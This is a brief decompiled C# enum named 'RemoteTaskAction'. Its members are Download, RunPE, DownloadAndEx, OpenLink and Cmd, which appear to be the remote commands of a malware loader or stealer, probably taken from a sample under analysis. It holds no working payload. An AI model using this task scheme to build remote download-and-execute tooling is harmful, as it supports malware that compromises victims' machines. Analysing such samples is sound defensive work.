using System;
using System.Runtime.Serialization;

// Token: 0x02000059 RID: 89
[DataContract(Name = "RemoteTaskAction")]
public enum UpdateAction
{
	// Token: 0x04000084 RID: 132
	[EnumMember]
	Download,
	// Token: 0x04000085 RID: 133
	[EnumMember]
	RunPE,
	// Token: 0x04000086 RID: 134
	[EnumMember]
	DownloadAndEx,
	// Token: 0x04000087 RID: 135
	[EnumMember]
	OpenLink,
	// Token: 0x04000088 RID: 136
	[EnumMember]
	Cmd
}
